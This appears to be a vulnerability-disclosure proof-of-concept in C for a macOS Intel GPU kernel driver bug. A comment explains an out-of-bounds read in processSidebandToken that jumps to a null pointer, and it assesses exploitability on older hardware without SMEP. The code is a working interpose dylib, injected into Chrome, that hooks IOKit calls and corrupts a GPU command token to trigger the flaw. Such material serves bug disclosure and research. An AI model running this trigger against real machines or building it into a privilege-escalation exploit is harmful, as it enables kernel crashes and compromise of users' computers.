/*
this is an interpose dylib, compile with: clang -Wall -dynamiclib -o ig_sideband_buffer_oob.dylib ig_sideband_buffer_oob.c -framework IOKit -arch i386 -arch x86_64
and load it like this: $ DYLD_INSERT_LIBRARIES=./ig_sideband_buffer_oob.dylib /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
navigating chrome to: http://damienmortini.me.uk/house/ triggers the BlitFramebuffer token (probably most webgl pages will do)

BUG:
The Intel GPU driver uses shared memory for drawing commands. The userspace
client of the driver calls IOConnectMapMemory to map a shared page which it will use,
calling selector 2 (submit_data_buffers) to signal to the driver that it should
consume the commands (tokens) written there by the client.

The function IGAccelGLContext::processSidebandToken checks the token ID and length then
jumps to the function responsible for actually parsing the token:

; IGAccelGLContext::processSidebandToken(IOAccelCommandStreamInfo &)
       push    rbp
       mov     rbp, rsp
       mov     ax, [rsi+18h]   ; this is the token id
       test    ax, ax
       jns     short not_us    ; jump if not sign - token must be >= 0x8000
       cmp     ax, 0A1FFh   
       ja      short err       ; jump if token > 0xa1ff
       movzx   ecx, ax         ; otherwise, take the upper 8 bits, subtract 0x80 and use as an index into s_cTokenInfo array of token function descriptors
       mov     r8, [rdi+1090h] ; 
       shr     ecx, 8
       add     ecx, 0FFFFFF80h
       lea     rcx, [rcx+rcx*2]
       mov     edx, [r8+rcx*8+10h] ; get pointer to descriptor

s_cTokenInfo points to an array of 0x21 descriptors (each 0x18 bytes) therefore the maximum index allowed should be 0x20. Supplying a token
with a token id field of 0xa100 will read a descriptor off the end of the s_cTokenInfo array. The bytes following the array happen to be zero, which means
that the code will reach a jmp rax where rax is zero.

Exploitability depends on two things: being able to map the zero page and being able to execute it - mapping the zero page is possible (see previous
bug reports) but SMEP (Supervisor Mode Execution Prevention) will stop exploitation of this for Ivy Bridge and newer cpus. On Sandy Bridge and older hardware
this bug will be exploitable (eg MacBookPro <= 8,3 which so far as I understand is still completely supported hardware.)

tested on: MacBookAir5,2 w/ 10.9.3/13d64
*/


#include <inttypes.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


void* token_buf = 0;

kern_return_t
fake_IOConnectMapMemory(
  io_connect_t connect,
  uint32_t memoryType,
  task_port_t intoTask,
  vm_address_t *atAddress,
  vm_size_t *ofSize,
  IOOptionBits options )
{
  kern_return_t ret = IOConnectMapMemory(connect, memoryType, intoTask, atAddress, ofSize, options);
  
  // is this the mapping for the sideband buffer for the gpu tokens?
  if (memoryType == 0){
    token_buf = *atAddress;
  }
  return ret;
}

kern_return_t
fake_IOConnectCallStructMethod(
        mach_port_t      connection,            // In
        uint32_t         selector,              // In
        const void      *inputStruct,           // In
        size_t           inputStructCnt,        // In
        void            *outputStruct,          // Out
        size_t          *outputStructCnt)       // In/Out
{ 
  if (selector == 2){
    if (token_buf != 0){
      uint16_t needle = 0x8500; // BlitFramebuffer token
      
      uint32_t* at = memmem(token_buf, 0x1000, &needle, 2);
      if (at){
        at[0] = 0x0002a100; //replace the token ID with 0xa1
        at[1] = 0x00000000;
      }
    }
  }

  return IOConnectCallStructMethod(
          connection,            // In
          selector,              // In
          inputStruct,           // In
          inputStructCnt,        // In
          outputStruct,          // Out
          outputStructCnt);      // In/Out

}

typedef struct interposer {
  void* replacement;
  void* original;
} interpose_t;

__attribute__((used)) static const interpose_t interposers[]
  __attribute__((section("__DATA, __interpose"))) =
    { {.replacement = (void*)fake_IOConnectMapMemory, .original = (void*)IOConnectMapMemory},
      {.replacement = (void*)fake_IOConnectCallStructMethod, .original = (void*)IOConnectCallStructMethod},
    };

